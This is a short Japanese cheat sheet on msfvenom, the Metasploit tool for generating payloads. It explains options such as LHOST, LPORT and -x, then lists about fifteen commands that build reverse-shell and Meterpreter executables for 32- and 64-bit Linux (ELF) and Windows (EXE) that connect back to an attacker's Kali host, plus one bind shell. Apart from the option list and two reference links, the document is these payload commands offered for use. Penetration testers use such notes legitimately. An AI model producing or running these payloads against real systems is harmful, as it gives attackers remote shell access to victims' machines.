## 概　要
>Metasploitの１つのモジュールでシェルコードやペイロードをコマンドで作成できるとても便利なツール。  
  
## オプション
- `-p`：使用するペイロード
- `LHOST`：攻撃後接続先となるホストのIP（KaliLinuxのIP）
- `LPORT`：攻撃後接続先となるポート番号
- `x`：ペイロード作成時に元となるファイル　※カレントディレクトリに置いてください
- `f`：ファイル形式
- `o`：出力ファイル名　※xオプションで指定したファイルとは違う名前
- `h`：ヘルプオプション
  
## 基本的な使い方（モデルはshell_codeのペイロード）
### Linux
```bash
## 32 bits
msfvenom -p linux/x86/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > shell.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > shell.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > shell.elf
```  
  
```bash
## 64 bits
msfvenom -p linux/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > shell.elf
msfvenom -p generic/shell_bind_tcp RHOST=$rhost LPORT=$lport -f elf > term.elf
```
  
### Windows
```cmd
## 32 bits
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe
msfvenom -p windows/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe
msfvenom -p windows/powershell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe
msfvenom -p windows/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe
```   
     
```cmd
## 64 bits
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe
```   
   
## 参　考
[msfvenom とは何なのか - Qiita](https://qiita.com/tanaka-nice/items/0ec926951ffa5a4d197c)  
[msfvenomを使ってペイロードを作成し侵入テストを行う - Qiita](https://qiita.com/seiteisama/items/a2e3f0d6ade54214f8d8)